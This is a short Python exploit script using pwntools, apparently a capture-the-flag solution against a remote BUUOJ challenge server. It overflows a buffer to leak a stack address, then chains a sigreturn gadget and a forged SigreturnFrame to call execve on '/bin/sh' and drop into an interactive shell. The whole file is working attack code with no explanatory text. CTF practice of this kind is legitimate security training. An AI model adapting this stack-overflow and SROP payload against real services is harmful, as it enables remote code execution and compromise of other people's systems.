from pwn import *

context(log_level = 'debug')
context(os="linux", arch="amd64")
p=remote("node5.buuoj.cn",28758)

syscall_ret = 0x400517#0x401179
mov_rax_0x0f_ret = 0x4004da#0x40113e # sigreturn
vuln_addr = 0x4004ed #0x401149
# first time
pld1 = b'a'*16+p64(vuln_addr)
p.send(pld1)

stack_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
p.success("stack_addr: {}".format(hex(stack_addr)))

# second time
pld2 = b'/bin/sh\x00'
pld2 = pld2.ljust(0x10, b'a')
pld2 += p64(mov_rax_0x0f_ret)
pld2 += p64(syscall_ret)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr - 0x118
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_ret
# print(sigframe)

pld2 += bytes(sigframe)
p.send(pld2)
p.interactive()
